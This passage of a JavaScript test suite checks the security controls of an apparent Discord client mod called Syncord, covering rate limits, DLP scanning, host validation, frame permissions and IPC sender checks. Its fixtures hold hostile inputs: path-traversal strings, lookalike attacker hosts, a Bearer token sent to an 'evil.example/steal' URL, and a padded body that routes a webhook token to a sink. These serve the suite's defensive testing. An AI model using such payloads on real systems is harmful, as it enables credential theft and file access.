  for (let i = 0; i < 5000; i += 1) {
    M.consumeLimit(`network:attacker-${i}-${"x".repeat(40)}`, "network");
  }
  const after = M.trackedBucketCount();
  assert.ok(
    after <= 512,
    `5000 distinct keys produced ${after} buckets — the map is unbounded (was ${before})`,
  );
  M.resetLimits();
  assert.equal(M.trackedBucketCount(), 0, "resetLimits must clear the map, not just refill it");
});

test("#26: a garbage plugin id shares one bucket instead of minting its own", async () => {
  // Driven through the real IPC handler, which is where the key is built.
  //
  // Note what is and is not being claimed. A *shape-valid but unregistered* id
  // (`zz-0-not-a-real-id`) still gets its own bucket — per-plugin limiting is
  // the point, and the broker refuses it a moment later for not being
  // registered. What must not happen is unbounded growth, so there are two
  // separate guarantees and this test covers the first:
  //
  //   (a) ids that are not even shaped like a plugin id share ONE bucket, so a
  //       caller cannot allocate by varying them at all;
  //   (b) the map is capped regardless — asserted in the previous test.
  M.registerIpc();
  M.resetLimits();
  const before = M.trackedBucketCount();

  const garbage = [
    "UPPERCASE",
    "has space",
    "0-leading-digit",
    "-leading-hyphen",
    "emoji\u{1f600}",
    "x".repeat(400),
    "",
    "../etc/passwd",
  ];
  for (let i = 0; i < 60; i += 1) {
    for (const shape of garbage) {
      try {
        await M.__ipcMain.__invoke("Syncord_NETWORK_REQUEST", TRUSTED_EVENT, {
          pluginId: `${shape}${i}`,
          url: "https://api.example.com/",
          method: "GET",
        });
      } catch {
        /* the channel limiter may refuse; the key space is the point */
      }
    }
  }

  const added = M.trackedBucketCount() - before;
  assert.ok(
    added <= 2,
    `${garbage.length * 60} garbage ids produced ${added} buckets — they must collapse to one`,
  );
  M.resetLimits();
});

test("#27: a spammed report channel stops writing after one record per cooldown", async () => {
  // The limiter was consulted and then ignored: every refused call still reached
  // `securityLog().record`, and each of those is an event plus an append to the
  // audit file. The rate limit existed and did not limit the thing it was
  // added for.
  M.registerIpc();
  M.resetLimits();
  // Counted by id window, not before/after totals: the event log is a bounded
  // ring, so a 400-event burst evicts the very events a "before" count was
  // holding on to. A before/after comparison here produced a *negative* delta,
  // which is how this test first failed.
  const all = () => M.securityLog().list(5000);
  const watermark = () => all().reduce((max, e) => Math.max(max, e.id ?? 0), 0);
  const countSince = (mark, type) => all().filter((e) => e.type === type && (e.id ?? 0) > mark).length;

  const spam = async (n) => {
    for (let i = 0; i < n; i += 1) {
      try {
        await M.__ipcMain.__invoke("Syncord_REPORT_EGRESS", TRUSTED_EVENT, {
          transport: "fetch",
          host: "spam.example",
          reason: "spam",
        });
      } catch {
        /* refused by the limiter; the writes are what is being counted */
      }
    }
  };

  const mark = watermark();
  await spam(400);

  const observed = countSince(mark, "EGRESS_OBSERVED");
  const triggered = countSince(mark, "RATE_LIMIT_TRIGGERED");

  // 400 calls must not produce 400 audit writes. The bucket is burst 15 plus
  // refill, so a small number of observations is correct — a large one is the
  // bug.
  assert.ok(
    observed <= 25,
    `400 reports wrote ${observed} EGRESS_OBSERVED records — the limiter is not limiting the writes`,
  );
  // And the refusal itself is announced once, not 385 times.
  assert.equal(
    triggered,
    1,
    `the rate-limit notice must be written once per cooldown, got ${triggered}`,
  );
  M.resetLimits();
});

test("#35: a raw credential padded past 64 KB is still seen", async () => {
  // The broker accepts 256 KB bodies; `detectSecrets` sampled the first 64 KB by
  // default. So 192 KB of every request went uninspected, and padding is free and
  // entirely under the caller's control — the padding *was* the bypass.
  M.setNetworkLockdown(false);
  M.loadCredentials({});
  M.registerPluginManifest([{ id: "padder", network: [{ host: "sink.example" }] }]);
  M.grantPermission({
    pluginId: "padder",
    category: "network-connect",
    host: "sink.example",
    methods: ["POST"],
  });

  // A shape the DLP patterns actually match. This took three attempts to get
  // right, and the misses are worth recording: the `authorization:` pattern
  // expects the unquoted header form, so a JSON body
  // (`{"authorization":"Bearer …"}`) does **not** match it, and the Discord-token
  // pattern is strict about each segment's length. A padded body built from a
  // shape DLP never looks for would have made this test pass for the wrong
  // reason — which is how it failed twice before landing here.
  //
  // A webhook URL inside a JSON body is both detectable and the realistic case:
  // routing message content to an attacker-controlled Discord webhook.
  const secret = JSON.stringify({
    target: "https://discord.com/api/webhooks/123456789012345678/tOkEnVaLuEtOkEnVaLuEtOkEnVaLuE",
  });
  const padded = "x".repeat(100 * 1024) + secret + "y".repeat(64 * 1024);

  await withBrokerFetch(
    () => new Response("{}", { status: 200 }),
    async () => {
      const result = await M.brokerRequest({
        pluginId: "padder",
        url: "https://sink.example/collect",
        method: "POST",
        body: padded,
      });
      assert.equal(
        result.ok,
        false,
        "a raw credential at byte ~100 KB must be caught — the request was sent",
      );
      assert.match(
        String(result.blockedReason ?? ""),
        /credential/i,
        `expected a DLP refusal, got: ${result.blockedReason}`,
      );
    },
  );
  assert.equal(M.__brokerLog().length, 0, "a DLP-blocked body must never reach the network");
});

test("#35: the same body without a credential still goes out", async () => {
  // The widened scan must not become a blanket refusal — a large legitimate body
  // is exactly the case that would break a plugin.
  M.setNetworkLockdown(false);
  M.registerPluginManifest([{ id: "bigbody", network: [{ host: "sink.example" }] }]);
  M.grantPermission({
    pluginId: "bigbody",
    category: "network-connect",
    host: "sink.example",
    methods: ["POST"],
  });
  const benign = "x".repeat(150 * 1024) + JSON.stringify({ note: "hello" });

  await withBrokerFetch(
    () => new Response("{}", { status: 200 }),
    async () => {
      const result = await M.brokerRequest({
        pluginId: "bigbody",
        url: "https://sink.example/upload",
        method: "POST",
        body: benign,
      });
      assert.equal(result.ok, true, `a large benign body must be allowed: ${result.blockedReason}`);
    },
  );
  assert.equal(M.__brokerLog().length, 1, "the request must actually have been sent");
});

test("#2: the grant path and the declared path agree on every host", () => {
  // Two validators for one concept is how a policy drifts, and these two had
  // drifted: `*.co.uk` was rejected where a plugin declared it and accepted where
  // a user granted it. A grant is a user-approved permission — the same decision
  // with a different person in the loop — so it cannot afford a looser rule.
  const REJECT = [
    "*.com", "*.io", "*.co.uk", "*.org.uk", "*.com.au",
    "*", "*.*", "https://a.com", "a.com/x", "a..b.com", "a.com:8443", "a@b.com", "",
  ];
  const ACCEPT = ["api.example.com", "*.discord.com", "*.example.com", "*.example.co.uk"];

  for (const host of REJECT) {
    assert.equal(
      M.grantPermission({ pluginId: "parity", category: "network-connect", host, methods: ["GET"] }).ok,
      false,
      `grant path must refuse ${JSON.stringify(host)}`,
    );
    // `registerPluginManifest` reports a malformed entry in `rejected` rather
    // than throwing, so that one bad plugin cannot take the whole manifest down.
    const manifest = M.registerPluginManifest([{ id: "parity", network: [{ host, methods: ["GET"] }] }]);
    assert.equal(
      manifest.accepted,
      0,
      `declared path must refuse ${JSON.stringify(host)} — the two paths must not disagree ` +
        `(rejected: ${JSON.stringify(manifest.rejected)})`,
    );
  }

  for (const host of ACCEPT) {
    const granted = M.grantPermission({
      pluginId: "parity",
      category: "network-connect",
      host,
      methods: ["GET"],
    });
    assert.equal(granted.ok, true, `grant path must accept ${host}: ${granted.ok ? "" : granted.reason}`);

    // And the declared path, via the shared helper the manifest validation calls.
    assert.equal(M.__validateNetworkHost?.(host)?.ok ?? true, true);
  }
  M.clearSessionGrants();
});

test("#1: the installed permission CHECK handler judges the frame, not the top level", () => {
  // The request handler was fixed to use `details.requestingUrl`; the check
  // handler was left on `contents.getURL()`. So a cross-origin iframe asking
  // "may I?" got a correct answer from one path while the flow that *decides*
  // "you may" still saw the top-level Discord origin.
  //
  // A primitive test of `decidePermission` cannot catch that — the bug is in the
  // wiring — so this drives the installed handler.
  M.installPermissionHandlers();
  const s = M.__electronSession.defaultSession;
  const check = s._checkHandler;
  assert.equal(typeof check, "function", "a check handler must be installed");

  // Top level is Discord throughout — the frame is what varies.
  const discordTop = { id: 9, getURL: () => "https://discord.com/app" };

  const ask = (frameUrl, requestingOrigin) =>
    check(discordTop, "media", requestingOrigin, { requestingUrl: frameUrl });

  assert.equal(ask("https://discord.com/app"), true, "Discord's own frame may ask");
  assert.equal(ask("https://canary.discord.com/app"), true, "canary is Discord-owned");
  assert.equal(ask("https://ptb.discord.com/app"), true, "ptb is Discord-owned");
  assert.equal(
    ask("https://evil.example/embed"),
    false,
    "a third-party frame inside Discord must not inherit the top-level origin's trust",
  );
  assert.equal(
    ask("https://discord.com.evil.example/embed"),
    false,
    "a lookalike host must be refused",
  );
  assert.equal(ask("data:text/html,<h1>x"), false, "a data: frame must be refused");

  // The requestingOrigin path is the documented second choice: no requestingUrl,
  // but an origin that is not Discord's.
  assert.equal(
    check(discordTop, "media", "https://evil.example", {}),
    false,
    "requestingOrigin must be honoured when requestingUrl is absent",
  );
  assert.equal(
    check(discordTop, "media", "https://discord.com", {}),
    true,
    "a Discord requestingOrigin must still be allowed",
  );
  assert.equal(
    check(discordTop, "media", "not a url", {}),
    false,
    "a present but malformed requestingOrigin must fail closed instead of inheriting the top level",
  );
  assert.equal(
    check(discordTop, "media", "null", {}),
    false,
    "an opaque requestingOrigin must fail closed instead of inheriting the trusted top level",
  );

  // Last-resort fallback: nothing but the top level. Discord's own document, so
  // allowed — this is the case that must not regress into a denial.
  assert.equal(check(discordTop, "media", undefined, {}), true, "top-level fallback still works");
});

test("#5: flooding with fake ids cannot reset a real plugin's rate-limit budget", async () => {
  // The dangerous version of this bug is not the memory growth — the Map was
  // already capped. It is that the cap *evicts*, and the victim chosen was the
  // lowest-token bucket. A real plugin sitting in cooldown has tokens = 0, so a
  // flood of syntactically-valid but unregistered ids could evict its bucket, and
  // the next genuine request would find nothing and be handed a **full** bucket.
  //
  // The cap turned a memory leak into a rate-limit bypass. A test that only
  // asserted `size <= 512` would have passed while the bypass was wide open.
  M.registerIpc();
  M.registerPluginManifest([{ id: "real", network: [{ host: "api.example.com" }] }]);
  M.resetLimits();

  const call = (pluginId) =>
    M.__ipcMain
      .__invoke("Syncord_NETWORK_REQUEST", TRUSTED_EVENT, {
        pluginId,
        url: "https://api.example.com/x",
        method: "GET",
      })
      .catch(() => "refused");

  // 1. Exhaust the real plugin's budget: burst is 15 for the network rule.
  const budget = M.RATE_LIMITS.network.burst;
  for (let i = 0; i < budget * 2; i += 1) await call("real");

  const afterExhaust = M.trackedBucketCount();

  // 2. It is now rate limited — that is the state whose eviction is the bug.
  assert.equal(
    (await call("real")).blockedReason,
    "rate limited",
    "precondition: the real plugin is in cooldown",
  );

  // 3. Flood with plausible-looking but unregistered ids.
  //
  //    500, not "thousands", and that number is load-bearing. The shared IPC
  //    channel has a burst of 600, so a larger flood trips *that* limiter, the
  //    call throws, and the assertion below ends up reading a rejection string
  //    instead of the network verdict — which is how the first version of this
  //    test passed for entirely the wrong reason. 500 is still enough to grow
  //    the Map past the 512 cap under the old per-id keying, so the eviction
  //    race is genuinely reachable.
  const flood = 500;
  for (let i = 0; i < flood; i += 1) await call(`zz-plausible-looking-id-${i}`);

  // The causal assertion, and the one that actually pins the fix.
  //
  // An earlier version of this test only checked the *outcome* ("real is still
  // rate limited"), and it passed with the old per-id keying too — because 500
  // fake ids stay under the 512 cap, so eviction was never reachable and the test
  // was measuring nothing. The bug needs the flood to create *new keys*; if no new
  // keys are created, the eviction can never happen, at any flood size.
  //
  // So assert the precondition directly: the flood must not grow the Map beyond
  // the single shared bucket. That is deterministic, unlike racing an eviction.
  const floodKeys = M.trackedBucketCount() - afterExhaust;
  assert.ok(
    floodKeys <= 2,
    `${flood} unregistered ids created ${floodKeys} new buckets — each one is eviction ` +
      `pressure, and the victim chosen is the lowest-token bucket, which is the ` +
      `in-cooldown bucket of a real plugin`,
  );

  const probe = await call("real");
  assert.notEqual(
    probe,
    "refused",
    "the flood tripped the shared IPC rate limit, so this test would be measuring " +
      "the wrong control — lower the flood size",
  );

  // 4. The real plugin must still be rate limited. If its bucket was evicted, it
  //    is not — and that is a working bypass, not a bookkeeping detail.
  const after = probe;
  assert.equal(
    after.blockedReason,
    "rate limited",
    "a flood of unregistered ids reset the real plugin's rate-limit budget — " +
      "the eviction victim was its in-cooldown bucket",
  );

  // 5. And the Map is still bounded, which is now defence in depth rather than
  //    the only defence.
  assert.ok(
    M.trackedBucketCount() <= 512,
    `bucket count must stay bounded, got ${M.trackedBucketCount()}`,
  );
  M.resetLimits();
});


test("#5: a full limiter table refuses a new key without evicting a cooled-down real bucket", () => {
  M.resetLimits();
  const rule = M.RATE_LIMITS.network;

  // Put a real key into cooldown (tokens=0), exactly the bucket the old
  // lowest-token eviction policy preferred to delete.
  for (let i = 0; i <= rule.burst; i += 1) M.consumeLimit("network:real-cap-test", "network");
  assert.equal(
    M.consumeLimit("network:real-cap-test", "network").allowed,
    false,
    "precondition: the real bucket must be cooling",
  );

  // Fill the rest of the bounded table with distinct keys. Existing buckets are
  // allowed to stay; the important property is that admitting one more key must
  // never delete the real bucket.
  for (let i = 0; i < 511; i += 1) {
    M.consumeLimit(`pressure:${i}`, "network");
  }
  assert.equal(M.trackedBucketCount(), 512, "precondition: limiter table is full");

  const newcomer = M.consumeLimit("pressure:overflow", "network");
  assert.equal(newcomer.allowed, false, "a new key must fail closed when no safe slot exists");
  assert.equal(M.trackedBucketCount(), 512, "refusing a new key must not grow or evict the table");

  assert.equal(
    M.consumeLimit("network:real-cap-test", "network").allowed,
    false,
    "the cooled-down real bucket must survive table pressure; recreating it would restore burst budget",
  );
  M.resetLimits();
});

test("#5: unregistered ids share a single bucket", async () => {
  M.registerIpc();
  M.registerPluginManifest([{ id: "known-one", network: [{ host: "api.example.com" }] }]);
  M.resetLimits();
  const before = M.trackedBucketCount();

  for (let i = 0; i < 300; i += 1) {
    try {
      await M.__ipcMain.__invoke("Syncord_NETWORK_REQUEST", TRUSTED_EVENT, {
        pluginId: `unknown-id-${i}`,
        url: "https://api.example.com/",
        method: "GET",
      });
    } catch {
      /* refused downstream; the key space is the point */
    }
  }
  assert.ok(
    M.trackedBucketCount() - before <= 2,
    `300 unregistered ids produced ${M.trackedBucketCount() - before} buckets — they must share one`,
  );
  M.resetLimits();
});

test("#6: redirect method derivation follows Fetch, including HEAD on a 303", async () => {
  // The table under test, one row at a time. Each row asserts the method the
  // broker *actually sent* on the second hop, read from the fetch log — not the
  // method it claims to have validated.
  const CASES = [
    { status: 302, from: "POST", expect: "GET", body: '{"a":1}' },
    { status: 303, from: "POST", expect: "GET", body: '{"a":1}' },
    { status: 303, from: "HEAD", expect: "HEAD", body: undefined },
    { status: 307, from: "POST", expect: "POST", body: '{"a":1}' },
    { status: 308, from: "POST", expect: "POST", body: '{"a":1}' },
    { status: 302, from: "HEAD", expect: "HEAD", body: undefined },
    { status: 301, from: "HEAD", expect: "HEAD", body: undefined },
    { status: 303, from: "GET", expect: "GET", body: undefined },
  ];

  for (const [i, c] of CASES.entries()) {
    const id = `redir-${i}`;
    M.setNetworkLockdown(false);
    M.loadCredentials({});
    M.registerPluginManifest([
      { id, network: [{ host: "start.example.com", methods: [c.from] }] },
    ]);
    // The redirect target is granted exactly the method we expect to be sent, so
    // a mismatch is refused and shows up as a wrong method rather than as a
    // silently allowed one.
    M.grantPermission({
      pluginId: id,
      category: "network-connect",
      host: "finish.example.com",
      methods: [c.expect],
    });

    await withBrokerFetch(
      (url) => {
        if (url.startsWith("https://start.example.com")) {
          return new Response("", { status: c.status, headers: { location: "https://finish.example.com/next" } });
        }
        return new Response("done", { status: 200 });
      },
      async () => {
        const result = await M.brokerRequest({
          pluginId: id,
          url: "https://start.example.com/go",
          method: c.from,
          body: c.body,
        });
        assert.equal(
          result.blockedReason,
          undefined,
          `${c.from} + ${c.status} -> ${c.expect}: refused (${result.blockedReason})`,
        );
      },
    );

    const hops = M.__brokerLog();
    assert.equal(hops.length, 2, `${c.from} + ${c.status}: the redirect must have been followed`);
    assert.equal(
      hops[1].method,
      c.expect,
      `${c.from} + ${c.status} must send ${c.expect} as the second hop, got ${hops[1].method}`,
    );
  }
  M.clearSessionGrants();
});

test("#6: a HEAD-only target is not refused by a 303, and not widened to a GET", async () => {
  // The specific miss: HEAD + 303 was validated as POST, so a HEAD-only grant was
  // refused and a POST grant was relied on for a HEAD. Both halves.
  M.setNetworkLockdown(false);
  M.loadCredentials({});
  M.registerPluginManifest([{ id: "headonly", network: [{ host: "start.example.com", methods: ["HEAD"] }] }]);
  M.grantPermission({ pluginId: "headonly", category: "network-connect", host: "finish.example.com", methods: ["HEAD"] });

  // Only the first hop redirects. Answering 303 to every URL — as an earlier
  // version of this test did — makes the broker follow a loop and fail with
  // "too many redirects", which is a different control entirely.
  await withBrokerFetch(
    (url) =>
      url.startsWith("https://start.example.com")
        ? new Response("", { status: 303, headers: { location: "https://finish.example.com/next" } })
        : new Response("done", { status: 200 }),
    async () => {
      const result = await M.brokerRequest({
        pluginId: "headonly",
        url: "https://start.example.com/go",
        method: "HEAD",
      });
      assert.equal(result.blockedReason, undefined, `a 303 on HEAD must not be refused: ${result.blockedReason}`);
    },
  );
  assert.equal(M.__brokerLog()[1].method, "HEAD", "the second hop must be HEAD, not a widened GET");
  M.clearSessionGrants();
});

// ── #7: the egress monitor reports truthfully, and its log is bounded ────────

test("#7: the Security Center calls the session layer a monitor, not a guard", async () => {
  // The layer records and does not cancel. Calling it "Network Guard / ON" told
  // the user a block was happening when nothing was blocked — and a security UI
  // that overstates its own controls is worse than one that says nothing.
  const { readFileSync } = await import("node:fs");
  const ui = readFileSync("src/renderer/ui/securityCenter.ts", "utf-8");
  const status = readFileSync("src/shared/native.ts", "utf-8");
  const session = readFileSync("src/main/security/session.ts", "utf-8");

  // The monitor must be named for what it is, in the type main fills in.
  assert.match(status, /egressMonitor: boolean/, "the status field must be named for the monitor");
  assert.doesNotMatch(
    status.replace(/\/\*[\s\S]*?\*\//g, ""),
    /egressGuard: boolean/,
    "the old `egressGuard` name overclaimed a block that does not happen",
  );

  // The UI must show the difference between the two layers.
  assert.match(ui, /OBSERVE-ONLY/, "the monitor pill must say observe-only");
  assert.match(ui, /ENFORCING/, "the broker pill must say enforcing — it is the denying layer");
  assert.doesNotMatch(
    ui,
    /row\("Network Guard"/,
    "the removed label asserted a block that never happens",
  );

  // And the source must not still describe itself as the enforcing layer.
  const header = session.slice(0, session.indexOf("*/"));
  assert.doesNotMatch(
    header,
    /the actual enforcement|is blocked here/i,
    "the header must not claim enforcement; a live launch showed why it cannot",
  );
});

test("#7: a flood of credential requests produces one notice per cooldown, not one per request", () => {
  // The limiter was consulted and then ignored for the write: every request past
  // the budget still recorded an event, and each is an event plus an audit append.
  M.installSessionGuards();
  M.resetLimits();
  const s = M.__electronSession.defaultSession;
  const handler = s.webRequest._sendHeaders;
  assert.equal(typeof handler, "function");

  const all = () => M.securityLog().list(5000);
  const watermark = () => all().reduce((max, e) => Math.max(max, e.id ?? 0), 0);
  const since = (mark, type) => all().filter((e) => e.type === type && (e.id ?? 0) > mark).length;

  const ask = () => {
    let answer;
    handler(
      { url: "https://api.spotify.com/v1/me", method: "GET", requestHeaders: { Authorization: "Bearer x" } },
      (result) => {
        answer = result;
      },
    );
    return answer;
  };

  const mark = watermark();
  for (let i = 0; i < 400; i += 1) ask();

  const observed = since(mark, "EGRESS_OBSERVED");
  const triggered = since(mark, "RATE_LIMIT_TRIGGERED");
  assert.ok(
    observed <= 25,
    `400 credential requests wrote ${observed} EGRESS_OBSERVED records — the limiter is not ` +
      `limiting the writes`,
  );
  assert.equal(
    triggered,
    1,
    `the suppression notice must be written once per cooldown, got ${triggered}`,
  );
});


test("#7: suppression bookkeeping stays bounded across many hostile hosts", () => {
  M.installSessionGuards();
  M.resetLimits();
  const s = M.__electronSession.defaultSession;
  const handler = s.webRequest._sendHeaders;
  assert.equal(typeof handler, "function");

  // Trip the per-host network limiter for more unique hosts than the suppression
  // table may retain. Each host needs burst+1 observations to reach suppression.
  const attemptsPerHost = M.RATE_LIMITS.network.burst + 1;
  for (let host = 0; host < 530; host += 1) {
    const url = `https://h${host}.example.test/x`;
    for (let i = 0; i < attemptsPerHost; i += 1) {
      handler(
        { url, method: "GET", requestHeaders: { Authorization: "Bearer x" } },
        () => {},
      );
    }
  }

  assert.ok(
    M.egressSuppressionCount() <= 512,
    `egress suppression state is unbounded: ${M.egressSuppressionCount()} entries`,
  );
  M.resetLimits();
});

test("#7: the monitor never cancels, whatever it observes", () => {
  // The other half of the honesty requirement: the UI says observe-only, so the
  // behaviour has to match. A test asserting a block here would make the UI text
  // false.
  M.installSessionGuards();
  const s = M.__electronSession.defaultSession;
  const handler = s.webRequest._sendHeaders;
  for (const [url, headers] of [
    ["https://api.spotify.com/v1/me", { Authorization: "Bearer x" }],
    ["https://dealer.spotify.com/v2/client", { Cookie: "d=1" }],
    ["https://evil.example/steal", { Authorization: "Bearer x" }],
  ]) {
    let answer;
    handler({ url, method: "GET", requestHeaders: headers }, (r) => {
      answer = r;
    });
    assert.notEqual(answer?.cancel, true, `${url} must not be cancelled — the layer is observe-only`);
    assert.deepEqual(
      answer?.requestHeaders,
      headers,
      `${url}: headers must be handed back unchanged or the request never completes`,
    );
  }
});


test("preload path: Windows host modules are accepted in main and the preload re-check", () => {
  const descriptor = Object.getOwnPropertyDescriptor(process, "resourcesPath");
  const resources = String.raw`C:\Users\anonxd\AppData\Local\Discord\app-1.0.52\resources`;
  const moduleBase = String.raw`C:\Users\anonxd\AppData\Local\Discord\app-1.0.52\modules`;
  const candidate = moduleBase + String.raw`\discord_desktop_core-2\discord_desktop_core\core.asar\mainScreenPreload.js`;
  try {
    Object.defineProperty(process, "resourcesPath", { value: resources, configurable: true });
    EB.app.__setAppPath(resources + String.raw`\_app.asar`);
    EB.app.__setUserDataPath(String.raw`C:\Users\anonxd\AppData\Roaming\discord`);
    const verdict = M.validateOriginalPreload(candidate);
    assert.equal(verdict.ok, true, verdict.reason);
    assert.equal(verdict.basename, "mainScreenPreload");
    const bases = M.allowedPreloadBases();
    assert.equal(M.validateDiscordPreloadPath(candidate, { allowedBases: bases }).ok, true);
    for (const outside of [
      candidate.replace("app-1.0.52", "app-1.0.51"),
      candidate.replace("Discord", "DiscordCanary"),
      moduleBase + "-evil/mainScreenPreload.js",
      String.raw`C:\Users\anonxd\AppData\Local\evil\mainScreenPreload.js`,
      moduleBase + String.raw`\..\evil\mainScreenPreload.js`,
      moduleBase + "/%252e%252e/evil/mainScreenPreload.js",
    ]) assert.equal(M.validateOriginalPreload(outside).ok, false, outside);
  } finally {
    if (descriptor) Object.defineProperty(process, "resourcesPath", descriptor);
    else delete process.resourcesPath;
    EB.app.__setAppPath(fake.resources);
    EB.app.__setUserDataPath(moduleRoot);
  }
});

test("preload path: lowercase Windows resources excludes Syncord's own preload", () => {
  const resources = String.raw`C:\Users\anonxd\AppData\Local\Discord\app-1.0.52\resources`;
  const verdict = M.validateDiscordPreloadPath(resources + String.raw`\app\preload.js`, {
    allowedBases: [resources],
  });
  assert.equal(verdict.ok, false);
  assert.match(verdict.reason, /Syncord directory/);
});

test("preload path: host module symlinks cannot expand trust outside the install", () => {
  const host = path.join(fake.base, "linux-host");
  const resources = path.join(host, "resources");
  const outside = path.join(fake.base, "outside-host");
  fs.mkdirSync(resources, { recursive: true });
  fs.mkdirSync(outside, { recursive: true });
  fs.symlinkSync(outside, path.join(host, "modules"), "junction");
  const descriptor = Object.getOwnPropertyDescriptor(process, "resourcesPath");
  try {
    Object.defineProperty(process, "resourcesPath", { value: resources, configurable: true });
    EB.app.__setAppPath(path.join(resources, "_app.asar"));
    const candidate = path.join(host, "modules", "mainScreenPreload.js");
    fs.writeFileSync(path.join(outside, "mainScreenPreload.js"), "// outside");
    assert.equal(M.validateOriginalPreload(candidate).ok, false);
    assert.equal(M.validateOriginalPreload(path.join(outside, "mainScreenPreload.js")).ok, false);
  } finally {
    if (descriptor) Object.defineProperty(process, "resourcesPath", descriptor);
    else delete process.resourcesPath;
    EB.app.__setAppPath(fake.resources);
  }
});


test("ipc: update restart is sender-gated and cannot quit without a prepared worker", async () => {
  M.registerIpc(); M.resetLimits();
  const channel = "Syncord_UPDATE_RESTART";
  assert.ok(M.__ipcMain.__registered().includes(channel));
  assert.equal(await M.__ipcMain.__invoke(channel, TRUSTED_EVENT), false);
  const untrusted = { sender: { getURL: () => "https://example.com/", id: 991 }, senderFrame: { url: "https://example.com/", parent: null } };
  await assert.rejects(Promise.resolve().then(() => M.__ipcMain.__invoke(channel, untrusted)));
});


test("recording IPC: untrusted origins/subframes cannot enumerate devices, capture, list, play or reveal files", async () => {
  if (!M.__ipcMain.__registered().includes("Syncord_RECORDING_START")) M.registerIpc();
  const channels=["START","STOP","STATUS","LIST","PLAY","REVEAL","DEVICES","PLAYBACK_READ","PLAYBACK_CLOSE"];
  for(const suffix of channels) for(const event of [makeEvent({url:"https://example.com"}),makeEvent({url:"https://discord.com",isMainFrame:false})]){
    await assert.rejects(Promise.resolve().then(()=>M.__ipcMain.__invoke("Syncord_RECORDING_"+suffix,event)),/Untrusted IPC sender/);
  }
});
test("recording workers: Discord and a forged local frame cannot write bytes or select a source", async () => {
  const channels=["WORKER_INIT","WORKER_SELECT","WORKER_READY","WORKER_CHUNK","WORKER_FINISH","WORKER_ERROR","DEVICES_RESULT"];
  for(const suffix of channels) for(const url of ["https://discord.com/app","https://syncord-recorder.invalid/capture"]){
    await assert.rejects(Promise.resolve().then(()=>M.__ipcMain.__invoke("Syncord_RECORDING_"+suffix,makeEvent({url}),0,new Uint8Array([1]))),/Untrusted recording worker/);
  }
});

test('statistics IPC: both fixed diagnostic methods reject untrusted origins and subframes',async()=>{
 M.registerIpc();M.resetLimits();
 for(const channel of ['Syncord_STATISTICS_SNAPSHOT','Syncord_STATISTICS_STORAGE']){
  assert.ok(M.__ipcMain.__registered().includes(channel));
  for(const event of [makeEvent({url:'https://example.com'}),makeEvent({url:'https://discord.com',isMainFrame:false})])
   await assert.rejects(Promise.resolve().then(()=>M.__ipcMain.__invoke(channel,event)),/Untrusted IPC sender/);
 }
});

test('ecosystem IPC: every fixed operation rejects foreign origins and Discord subframes before authentication',async()=>{
 M.registerIpc();M.resetLimits();
 for(const suffix of ['STATUS','LINK','POLL','PROFILE','CATALOG','BUY','ACTIVE','HISTORY','LOOKUP','DISCONNECT']){
  const channel='Syncord_ECO_'+suffix;assert.ok(M.__ipcMain.__registered().includes(channel));
  for(const event of [makeEvent({url:'https://example.com'}),makeEvent({url:'https://discord.com',isMainFrame:false})])
   await assert.rejects(Promise.resolve().then(()=>M.__ipcMain.__invoke(channel,event,'1554184140704841939')),/Untrusted IPC sender/);
 }
});


test('popout IPC: Discord bridge rejects untrusted origins and subframes; child bridge rejects owner forgeries',async()=>{
 M.registerIpc();M.resetLimits();
 for(const suffix of ['CONNECT','OPEN','STOP','PUBLISH'])for(const event of [
  {sender:{getURL:()=>"https://evil.invalid/",id:991},senderFrame:{url:"https://evil.invalid/",parent:null}},
  {sender:{getURL:()=>"https://discord.com/channels/@me",id:991},senderFrame:{url:"https://discord.com/channels/@me",parent:{}}},
 ])await assert.rejects(Promise.resolve().then(()=>M.__ipcMain.__invoke('Syncord_POPOUT_'+suffix,event)),/Untrusted IPC sender/);
 for(const suffix of ['INIT','ACTION'])await assert.rejects(Promise.resolve().then(()=>M.__ipcMain.__invoke('Syncord_POPOUT_'+suffix,{sender:{id:991},senderFrame:{url:'syncord-chat:\/\/local/chat'}})),/Untrusted chat window/);
});


test('Drop IPC: all fixed disk and signaling channels reject foreign origins and Discord subframes before any capability lookup',async()=>{
 M.registerIpc();M.resetLimits();
 for(const suffix of ['CONNECT','INBOX','PICK','INVITE','VIEW','ACTION','SAVE','READ','WRITE','HASH','FINISH','REVEAL','STOP']){
  const channel='Syncord_DROP_'+suffix;assert.ok(M.__ipcMain.__registered().includes(channel));
  for(const event of [makeEvent({url:'https://example.com'}),makeEvent({url:'https://discord.com',isMainFrame:false})])
   await assert.rejects(Promise.resolve().then(()=>M.__ipcMain.__invoke(channel,event)),/Untrusted IPC sender/);
 }
});

test('snapshot IPC: only the trusted calling page is captured, scaled by zoom, and only its size returns', async () => {
  if (!M.__ipcMain.__registered().includes('Syncord_SNAPSHOT_COPY')) M.registerIpc();
  M.resetLimits();
  for (const event of [makeEvent({url:'https://example.com'}), makeEvent({url:'https://discord.com',isMainFrame:false})])
    await assert.rejects(Promise.resolve().then(() => M.__ipcMain.__invoke('Syncord_SNAPSHOT_COPY', event, {x:0,y:0,width:10,height:10})), /Untrusted IPC sender/);
  const asked = [];
  const image = { isEmpty: () => false, toPNG: () => Buffer.from([137, 80, 78, 71]), getSize: () => ({ width: 300, height: 200 }) };
  const sender = { ...TRUSTED_EVENT.sender, getZoomFactor: () => 1.5, capturePage: async (rect) => { asked.push(rect); return image; } };
  const event = { ...TRUSTED_EVENT, sender };
  await assert.rejects(Promise.resolve().then(() => M.__ipcMain.__invoke('Syncord_SNAPSHOT_COPY', event, {x:-5,y:0,width:10,height:10})), /Invalid snapshot area/);
  assert.equal(asked.length, 0, 'an invalid area never reaches capturePage');
  const result = await M.__ipcMain.__invoke('Syncord_SNAPSHOT_COPY', event, {x:10,y:20,width:200,height:100});
  assert.deepEqual(result, { width: 300, height: 200 });
  assert.deepEqual(asked, [{ x: 15, y: 30, width: 300, height: 150 }]);
  const written = M.__clipboard.__writes.at(-1);
  assert.equal(written.length, 1);
  assert.equal(written[0].items['image/png'].type, 'image/png');
  const empty = { ...event, sender: { ...sender, capturePage: async () => ({ ...image, isEmpty: () => true }) } };
  await assert.rejects(Promise.resolve().then(() => M.__ipcMain.__invoke('Syncord_SNAPSHOT_COPY', empty, {x:0,y:0,width:1,height:1})), /Snapshot unavailable/);
});
